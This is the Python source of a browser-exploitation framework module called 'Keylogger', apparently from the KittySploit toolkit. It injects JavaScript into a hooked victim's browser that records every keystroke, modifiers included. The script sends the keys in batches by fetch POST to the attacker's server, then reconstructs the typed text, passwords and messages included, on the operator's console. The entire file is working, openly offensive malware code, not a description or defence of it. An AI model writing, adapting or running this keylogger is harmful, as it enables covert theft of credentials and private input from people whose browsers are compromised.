from kittysploit import *
import time

class Module(BrowserAuxiliary):

    __info__ = {
        "name": "Keylogger",
        "description": "Log keystrokes from browser victim and receive them in real-time",
        "author": "KittySploit Team",
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
    }	

    timeout = OptInteger(30, "Timeout in seconds to stop the keylogger", True)

    def run(self):
        """Log keystrokes from the target browser session and receive them"""
        # Generate unique command ID for keylogger
        import uuid
        keylogger_id = str(uuid.uuid4())
        
        # JavaScript code to install keylogger
        # The keylogger will send keystrokes to the server via the response API
        # Get SERVER_HOST and SERVER_PORT from the xss_injection.js script via window.kittysploit
        code_js = f"""
        (function() {{
            const KEYLOGGER_ID = '{keylogger_id}';
            
            let SERVER_HOST = '127.0.0.1';
            let SERVER_PORT = '8080';
            
            if (window.kittysploit) {{
                if (typeof window.kittysploit.getServerHost === 'function') {{
                    SERVER_HOST = window.kittysploit.getServerHost();
                }}
                if (typeof window.kittysploit.getServerPort === 'function') {{
                    SERVER_PORT = window.kittysploit.getServerPort();
                }}
            }}
            
            // Store captured keystrokes
            let keystrokes = [];
            let keyloggerActive = true;
            
            // Function to send keystrokes to server
            function sendKeystrokes(keys) {{
                if (keys.length === 0) return;
                
                // Get session ID from kittysploit global or from closure
                let currentSessionId = null;
                if (window.kittysploit && typeof window.kittysploit.sessionId === 'function') {{
                    currentSessionId = window.kittysploit.sessionId();
                }}
                
                const data = {{
                    session_id: currentSessionId,
                    command_id: KEYLOGGER_ID,
                    result: JSON.stringify({{
                        type: 'keystrokes',
                        keys: keys,
                        timestamp: new Date().toISOString()
                    }}),
                    timestamp: new Date().toISOString()
                }};
                
                fetch(`http://${{SERVER_HOST}}:${{SERVER_PORT}}/api/command`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(data)
                }}).catch(error => {{}});
                
                // Clear sent keystrokes
                keystrokes = [];
            }}
            
            // Keydown event handler
            function keydownHandler(event) {{
                if (!keyloggerActive) return;
                
                const keyData = {{
                    key: event.key,
                    code: event.code,
                    keyCode: event.keyCode,
                    shiftKey: event.shiftKey,
                    ctrlKey: event.ctrlKey,
                    altKey: event.altKey,
                    metaKey: event.metaKey,
                    timestamp: new Date().toISOString()
                }};
                
                keystrokes.push(keyData);
                
                // Send keystrokes every 5 keys or every 2 seconds
                if (keystrokes.length >= 5) {{
                    sendKeystrokes(keystrokes.slice());
                }}
            }}
            
            // Send remaining keystrokes periodically
            const sendInterval = setInterval(() => {{
                if (keystrokes.length > 0 && keyloggerActive) {{
                    sendKeystrokes(keystrokes.slice());
                }}
            }}, 2000);
            
            // Install keylogger
            document.addEventListener('keydown', keydownHandler);
            
            // Store cleanup function globally
            window._keyloggerCleanup = function() {{
                keyloggerActive = false;
                document.removeEventListener('keydown', keydownHandler);
                clearInterval(sendInterval);
                // Send any remaining keystrokes
                if (keystrokes.length > 0) {{
                    sendKeystrokes(keystrokes.slice());
                }}
            }};
            
            return 'Keylogger installed';
        }})();
        """
        
        print_status(f"Installing keylogger (ID: {keylogger_id[:8]}...) for {self.timeout} seconds...")
        print_status("Capturing keystrokes... Press Ctrl+C to stop early")
        
        # Install keylogger
        if not self.send_js(code_js):
            print_error("Failed to install keylogger")
            return False
        
        # Monitor for keystrokes
        start_time = time.time()
        last_response_count = 0
        total_keys = 0
        all_keystrokes = []  
        
        def format_key_display(key_data):
            """Format a key data for display"""
            key = key_data.get('key', '')
            modifiers = []
            if key_data.get('shiftKey'):
                modifiers.append('Shift')
            if key_data.get('ctrlKey'):
                modifiers.append('Ctrl')
            if key_data.get('altKey'):
                modifiers.append('Alt')
            if key_data.get('metaKey'):
                modifiers.append('Meta')
            
            modifier_str = '+'.join(modifiers) + '+' if modifiers else ''
            
            # Special handling for special keys
            if key == ' ':
                key_display = '[Space]'
            elif key == 'Enter':
                key_display = '[Enter]'
            elif key == 'Backspace':
                key_display = '[Backspace]'
            elif key == 'Tab':
                key_display = '[Tab]'
            elif key == 'Escape':
                key_display = '[Esc]'
            elif len(key) == 1:
                key_display = key
            else:
                key_display = f'[{key}]'
            
            return modifier_str, key_display
        
        def reconstruct_text(keystrokes):
            """Reconstruct text from keystrokes"""
            text = []
            for key_data in keystrokes:
                key = key_data.get('key', '')
                
                # Handle special keys
                if key == 'Enter':
                    text.append('\n')
                elif key == 'Tab':
                    text.append('\t')
                elif key == 'Backspace':
                    if text:
                        text.pop()
                elif key == 'Space' or key == ' ':
                    text.append(' ')
                elif len(key) == 1:
                    # Regular character
                    if key_data.get('shiftKey'):
                        # Handle shift-modified characters
                        if key.isalpha():
                            text.append(key.upper() if key.islower() else key.lower())
                        else:
                            # Handle special shift characters
                            shift_map = {
                                '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                                '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
                                '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
                                ';': ':', "'": '"', ',': '<', '.': '>', '/': '?'
                            }
                            text.append(shift_map.get(key, key))
                    else:
                        text.append(key)
                # Ignore other special keys for text reconstruction
            
            return ''.join(text)
        
        try:
            while time.time() - start_time < self.timeout:
                # Get session to check for new responses
                session = self.browser_server.get_session(self.session_id)
                if not session:
                    print_error("Session not found")
                    break
                
                # Check for new responses with our keylogger ID
                if len(session.responses) > last_response_count:
                    for response in session.responses[last_response_count:]:
                        if response.get('command_id') == keylogger_id:
                            try:
                                result_data = response.get('result', '')
                                if result_data:
                                    import json
                                    data = json.loads(result_data)
                                    if data.get('type') == 'keystrokes':
                                        keys = data.get('keys', [])
                                        for key_data in keys:
                                            total_keys += 1
                                            all_keystrokes.append(key_data)
                                            
                                            # Format and display key in real-time
                                            modifier_str, key_display = format_key_display(key_data)
                                            print_info(f"[KEY] {modifier_str}{key_display}")
                            except Exception as e:
                                print_error(f"Error parsing keystroke data: {e}")
                    
                    last_response_count = len(session.responses)
                
                time.sleep(0.5)  # Check every 0.5 seconds
                
        except KeyboardInterrupt:
            print_status("Stopping keylogger...")
        
        # Stop keylogger
        print_status("[*] Stopping keylogger...")
        stop_code = "if (window._keyloggerCleanup) { window._keyloggerCleanup(); }"
        self.send_js(stop_code)
        
        # Wait a bit for final keystrokes to arrive
        time.sleep(1)
        
        # Check for any remaining keystrokes
        session = self.browser_server.get_session(self.session_id)
        if session:
            for response in session.responses[last_response_count:]:
                if response.get('command_id') == keylogger_id:
                    try:
                        result_data = response.get('result', '')
                        if result_data:
                            import json
                            data = json.loads(result_data)
                            if data.get('type') == 'keystrokes':
                                keys = data.get('keys', [])
                                for key_data in keys:
                                    total_keys += 1
                                    all_keystrokes.append(key_data)
                                    
                                    # Format and display key
                                    modifier_str, key_display = format_key_display(key_data)
                                    print_info(f"[KEY] {modifier_str}{key_display}")
                    except Exception as e:
                        pass
        
        # Reconstruct and display the complete text
        print_info("="*80)
        print_status("Reconstructing captured text...")
        print_info("="*80)
        
        if all_keystrokes:
            reconstructed_text = reconstruct_text(all_keystrokes)
            if reconstructed_text.strip():
                print_info(reconstructed_text)
            else:
                print_status("No text characters captured (only special keys)")
        else:
            print_status("No keystrokes captured")
        
        print_info("="*80)
        print_success(f"Keylogger stopped. Total keystrokes captured: {total_keys} in {time.time() - start_time:.1f} seconds")
        return True